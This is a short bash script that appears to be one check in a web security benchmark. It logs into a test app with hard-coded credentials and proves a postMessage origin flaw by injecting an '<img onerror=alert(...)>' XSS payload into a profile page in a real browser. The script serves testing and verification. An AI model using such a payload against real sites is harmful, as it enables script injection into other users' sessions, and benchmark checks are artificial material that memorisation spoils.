#!/usr/bin/env bash
# POSTMSG-001 (CWE-346/79): the profile page's widget bridge accepts a message
# from any origin and renders its payload as HTML. Proven in a real browser.
set -eu; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
M="POSTMSG-PROVEN-7f3a"
JS="window.postMessage({type:'benchboard:notice',html:\"<img src=x onerror=alert('$M')>\"},'*'); await new Promise(function(r){setTimeout(r,1500);}); return 'sent';"
browser_dialog "$TARGET/profile" "$M" --eval "$JS" $(cookie_args)
